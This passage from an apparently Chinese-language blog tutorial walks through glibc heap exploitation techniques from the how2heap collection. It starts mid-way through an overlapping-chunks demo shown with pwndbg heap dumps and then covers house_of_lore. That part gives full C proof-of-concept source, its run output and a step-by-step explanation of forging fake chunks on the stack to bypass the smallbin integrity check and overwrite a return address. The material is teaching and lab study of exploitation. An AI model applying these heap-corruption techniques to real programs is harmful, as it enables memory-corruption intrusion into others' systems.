inside chunk p3: </span><br><span class="line"></span><br><span class="line">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�</span><br><span class="line"></span><br><span class="line">Let&apos;s write something inside p6</span><br><span class="line"></span><br><span class="line">Data inside chunk p3: </span><br><span class="line"></span><br><span class="line">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�</span><br></pre></td></tr></table></figure>
<p>分析：</p>
<ul>
<li>分配5个chunks,并初始化</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1 = malloc(1000);</span><br><span class="line">p2 = malloc(1000);</span><br><span class="line">p3 = malloc(1000);</span><br><span class="line">p4 = malloc(1000);</span><br><span class="line">p5 = malloc(1000);</span><br></pre></td></tr></table></figure>
<ul>
<li><p>释放p4,<code>free(p4)</code>，因为p4和top chunk不相邻，所以，释放后，不会和top chunk合并</p>
<p>p4会处于 unsorted bin中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b78</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用p1的溢出，修改p2的size</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;                         // p1</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1009, </span><br><span class="line">  fd = 0x4141414141414141, </span><br><span class="line">  bk = 0x4141414141414141, </span><br><span class="line">  fd_nextsize = 0x4141414141414141, </span><br><span class="line">  bk_nextsize = 0x4141414141414141</span><br><span class="line">&#125;</span><br><span class="line">0x6033f0 PREV_INUSE &#123;                        // p2</span><br><span class="line">  prev_size = 4702111234474983745, </span><br><span class="line">  size = 2017, </span><br><span class="line">  fd = 0x4242424242424242, </span><br><span class="line">  bk = 0x4242424242424242, </span><br><span class="line">  fd_nextsize = 0x4242424242424242, </span><br><span class="line">  bk_nextsize = 0x4242424242424242</span><br><span class="line">&#125;</span><br><span class="line">0x603bd0 PREV_INUSE &#123;                            // p4</span><br><span class="line">  prev_size = 4846791580151137091, </span><br><span class="line">  size = 1009, </span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x4444444444444444, </span><br><span class="line">  bk_nextsize = 0x4444444444444444</span><br><span class="line">&#125;</span><br><span class="line">0x603fc0 &#123;                                        // p5</span><br><span class="line">  prev_size = 1008, </span><br><span class="line">  size = 1008, </span><br><span class="line">  fd = 0x4545454545454545, </span><br><span class="line">  bk = 0x4545454545454545, </span><br><span class="line">  fd_nextsize = 0x4545454545454545, </span><br><span class="line">  bk_nextsize = 0x4545454545454545</span><br><span class="line">&#125;</span><br><span class="line">0x6043b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 4991471925827290437, </span><br><span class="line">  size = 130129, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>释放p2,这时，glibc会认为p2下一个chunk是p4,因为p2 + size_of_p2  ——&gt; p4，从上边的示意图可以看出。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1009, </span><br><span class="line">  fd = 0x4141414141414141, </span><br><span class="line">  bk = 0x4141414141414141, </span><br><span class="line">  fd_nextsize = 0x4141414141414141, </span><br><span class="line">  bk_nextsize = 0x4141414141414141</span><br><span class="line">&#125;</span><br><span class="line">0x6033f0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 4702111234474983745, </span><br><span class="line">  size = 3025, </span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603fc0 &#123;</span><br><span class="line">  prev_size = 3024, </span><br><span class="line">  size = 1008, </span><br><span class="line">  fd = 0x4545454545454545, </span><br><span class="line">  bk = 0x4545454545454545, </span><br><span class="line">  fd_nextsize = 0x4545454545454545, </span><br><span class="line">  bk_nextsize = 0x4545454545454545</span><br><span class="line">&#125;</span><br><span class="line">0x6043b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 4991471925827290437, </span><br><span class="line">  size = 130129, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x6033f0 ◂— 0x7ffff7dd1b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<ul>
<li>申请0x2000大小的区块,p6</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p6 = malloc(2000);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1009, </span><br><span class="line">  fd = 0x4141414141414141, </span><br><span class="line">  bk = 0x4141414141414141, </span><br><span class="line">  fd_nextsize = 0x4141414141414141, </span><br><span class="line">  bk_nextsize = 0x4141414141414141</span><br><span class="line">&#125;</span><br><span class="line">0x6033f0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 4702111234474983745, </span><br><span class="line">  size = 2017, </span><br><span class="line">  fd = 0x7ffff7dd2158 &lt;main_arena+1592&gt;, </span><br><span class="line">  bk = 0x7ffff7dd2158 &lt;main_arena+1592&gt;, </span><br><span class="line">  fd_nextsize = 0x6033f0, </span><br><span class="line">  bk_nextsize = 0x6033f0</span><br><span class="line">&#125;</span><br><span class="line">0x603bd0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 4846791580151137091, </span><br><span class="line">  size = 1009, </span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;, </span><br><span class="line">  fd_nextsize = 0x4444444444444444, </span><br><span class="line">  bk_nextsize = 0x4444444444444444</span><br><span class="line">&#125;</span><br><span class="line">0x603fc0 &#123;</span><br><span class="line">  prev_size = 1008, </span><br><span class="line">  size = 1008, </span><br><span class="line">  fd = 0x4545454545454545, </span><br><span class="line">  bk = 0x4545454545454545, </span><br><span class="line">  fd_nextsize = 0x4545454545454545, </span><br><span class="line">  bk_nextsize = 0x4545454545454545</span><br><span class="line">&#125;</span><br><span class="line">0x6043b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 4991471925827290437, </span><br><span class="line">  size = 130129, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x7ffff7dd1b78 (main_arena+88) —▸ 0x603bd0 ◂— 0x7ffff7dd1b78</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
<p>这时候: </p>
<p>p6 ————-&gt;      0x6033f0 ~ 0x603bd0</p>
<p>p3 ————-&gt;      0x6037e0 ~ 0x603bd0</p>
<p>有了重叠的区域。</p>
<h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h1><p>glibc需求: Ubuntu 14.04.4 - 32bit - glibc-2.23</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">void jackpot()&#123; puts(&quot;Nice jump d00d&quot;); exit(0); &#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[])&#123;</span><br><span class="line">  intptr_t* stack_buffer_1[4] = &#123;0&#125;;</span><br><span class="line">  intptr_t* stack_buffer_2[3] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">  intptr_t *victim = malloc(100);</span><br><span class="line">  intptr_t *victim_chunk = victim-2;</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Create a fake chunk on the stack\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span><br><span class="line">         &quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;);</span><br><span class="line">  stack_buffer_1[0] = 0;</span><br><span class="line">  stack_buffer_1[1] = 0;</span><br><span class="line">  stack_buffer_1[2] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span><br><span class="line">         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span><br><span class="line">         &quot;chunk on stack&quot;);</span><br><span class="line">  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</span><br><span class="line">  </span><br><span class="line">  fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br><span class="line">         &quot;the small one during the free()\n&quot;);</span><br><span class="line">  void *p5 = malloc(1000);</span><br><span class="line">  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\n&quot;, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;, victim);</span><br><span class="line">  free((void*)victim);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;\nIn the unsorted bin the victim&apos;s fwd and bk pointers are nil\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;victim-&gt;fwd: %p\n&quot;, (void *)victim[0]);</span><br><span class="line">  fprintf(stderr, &quot;victim-&gt;bk: %p\n\n&quot;, (void *)victim[1]);</span><br><span class="line"></span><br><span class="line">  void *p2 = malloc(1200);</span><br><span class="line"></span><br><span class="line">  //------------VULNERABILITY-----------</span><br><span class="line">  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack</span><br><span class="line"></span><br><span class="line">  //------------------------------------</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;);</span><br><span class="line"></span><br><span class="line">  void *p3 = malloc(100);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;);</span><br><span class="line">  char *p4 = malloc(100);</span><br><span class="line">  fprintf(stderr, &quot;p4 = malloc(100)\n&quot;);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;,</span><br><span class="line">         stack_buffer_2[2]);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, &quot;\np4 is %p and should be on the stack!\n&quot;, p4); // this chunk will be allocated on stack</span><br><span class="line">  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode</span><br><span class="line">  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">qianfa@qianfa:~/Desktop/how2heap/glibc_2.25$ ./house_of_lore</span><br><span class="line"></span><br><span class="line">Welcome to the House of Lore</span><br><span class="line">This is a revisited version that bypass also the hardening check introduced by glibc malloc</span><br><span class="line">This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23</span><br><span class="line"></span><br><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at 0xe4e010</span><br><span class="line">stack_buffer_1 at 0x7fff62eb48d0</span><br><span class="line">stack_buffer_2 at 0x7fff62eb48b0</span><br><span class="line">Create a fake chunk on the stack</span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list</span><br><span class="line">Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()</span><br><span class="line">Allocated the large chunk on the heap at 0xe4e080</span><br><span class="line">Freeing the chunk 0xe4e010, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&apos;s fwd and bk pointers are nil</span><br><span class="line">victim-&gt;fwd: (nil)</span><br><span class="line">victim-&gt;bk: (nil)</span><br><span class="line"></span><br><span class="line">Now performing a malloc that can&apos;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0xe4e010 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&apos;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0xe4e470</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7fbe5a917bd8</span><br><span class="line">victim-&gt;bk: 0x7fbe5a917bd8</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 = malloc(100)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7fbe5a917bd8</span><br><span class="line"></span><br><span class="line">p4 is 0x7fff62eb48e0 and should be on the stack!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>
<p>malloc时，需要bypass的检查如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bck = victim-&gt;bk;</span><br><span class="line">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="line">if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">     errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="line">     goto errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>定义两个数组，并初始化</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intptr_t* stack_buffer_1[4] = &#123;0&#125;;</span><br><span class="line">intptr_t* stack_buffer_2[3] = &#123;0&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>分配一个small chunk,并定义一个指针指向该chunk的头部</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">intptr_t *victim = malloc(100);</span><br><span class="line">intptr_t *victim_chunk = victim-2;</span><br></pre></td></tr></table></figure>
<ul>
<li>在栈上伪造一个fake chunk_1,并将fake chunk_1的fd指针指向 victim_chunk,来绕过针对small bin是否被破坏的检查。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stack_buffer_1[0] = 0;</span><br><span class="line">stack_buffer_1[1] = 0;</span><br><span class="line">stack_buffer_1[2] = victim_chunk;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置fake chunk_1的bk指针指向 stack_buffer_2，同时设置fake chunk_2的fd指针指向stack_buffer_1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack_buffer_1[3] = (intptr_t*)stack_buffer_2;</span><br><span class="line">stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>申请一个新的chunk <code>void *p5 = malloc(1000);</code>,防止释放victim时，victim和top_chunk合并。</p>
</li>
<li><p>释放 victim,victim将被放到fast bin中。它的bk和fd指针都是nil.</p>
</li>
<li><p>申请一个新的chunk <code>void *p2 = malloc(1200);</code></p>
<p>由于1200大小的chunk在bin中找不到，所以fastbin中的chunk将被放到small bin中。现在victim将处于small bin中。并且它的fd和bk指针都有了变化，指向main_arena中&lt;main_arena+184&gt;。</p>
</li>
<li><p>现在假设有溢出可以覆盖 victim-&gt;bk指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack</span><br></pre></td></tr></table></figure>
<p>得到small bin链如下(注意: small bins 是先进后出的，节点的增加发生在链表头部，而删除发生在尾部）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head  &lt;-fake chunk2 &lt;- facke chunk1 &lt;- victim chunk</span><br></pre></td></tr></table></figure>
